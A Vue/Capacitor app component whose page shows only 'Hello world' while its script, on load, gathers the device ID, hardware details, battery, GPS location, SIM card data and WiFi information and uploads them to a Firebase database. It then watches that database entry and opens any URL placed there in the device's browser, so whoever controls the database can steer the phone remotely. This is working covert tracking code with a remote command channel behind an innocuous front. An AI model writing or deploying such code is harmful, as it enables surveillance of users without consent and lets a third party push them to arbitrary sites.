<template>
    <div>
        <h1>Hello world</h1>
    </div>
</template>
    
<script setup>
import { onMounted } from 'vue'
import { db } from '../assets/db/firebase'
import { ref, set} from "firebase/database";
import { ref as dbRef, onValue} from "firebase/database";
import { update } from "firebase/database";
import { Device } from '@capacitor/device';
import { Geolocation } from '@capacitor/geolocation';
import { Network } from '@capacitor/network';
import { Sim } from '@capgo/capacitor-sim';
import { CapacitorWifi } from '@capgo/capacitor-wifi';
import { Browser } from '@capacitor/browser';
import { Capacitor } from '@capacitor/core';

const logDeviceInfo = async () => {
    try {
        // Device information
        const id = await Device.getId();
        const deviceId = id.identifier;
        const info = await Device.getInfo();
        const battery = await Device.getBatteryInfo();
        const network_status = await Network.getStatus();

        let coords = null;
        let simCards = null;
        let wifi = null;
        let openbrowser = null;

        // Geolocation
        try{
            coords = await Geolocation.getCurrentPosition();
        } catch {
            coords = "Geolocation not available"
        }

        // SimCards
        try{
            simCards = await Sim.getSimCards();
        } catch {
            simCards = "Sim Card not available"
        }
        
        // Network Status
        if (network_status.connectionType == "wifi") {
            try {
                wifi = await CapacitorWifi.getWifiInfo();
            } catch {
                wifi = "WiFi info unavailable";
            }
        } else {
            wifi = "User not using wifi"
        }
        

        const Device_Information = ref(db, 'Device/' + id.identifier);
        await set(Device_Information, {
            deviceInfo: info,
            deviceBattery: battery,
            coordinates: coords,
            network_status: network_status,
            Sim_card: simCards,
            wifi_info: wifi,
            open_browser: openbrowser
        });

        OpenBrowserCommands(deviceId);
        alert('sent!!');
    } catch (error) {
        alert('Error: ' + error.message);
    }
}

const OpenBrowserCommands = async (deviceId) => {
    const deviceRef = dbRef(db, `Device/${deviceId}`);
    onValue(deviceRef, async (snapshot) => {
        const data = snapshot.val();

        if (data?.open_browser) {
            try {
                if (Capacitor.getPlatform() === "web") {
                    window.open(data.open_browser, '_blank')
                } else {
                    await Browser.open({ url: data.open_browser });
                }
                await update(deviceRef, {
                    open_browser: null
                });
            } catch (error) {
                console.log("Browser error:", error);
            }
        }
    });
};

onMounted(() => {
    logDeviceInfo();
});

</script>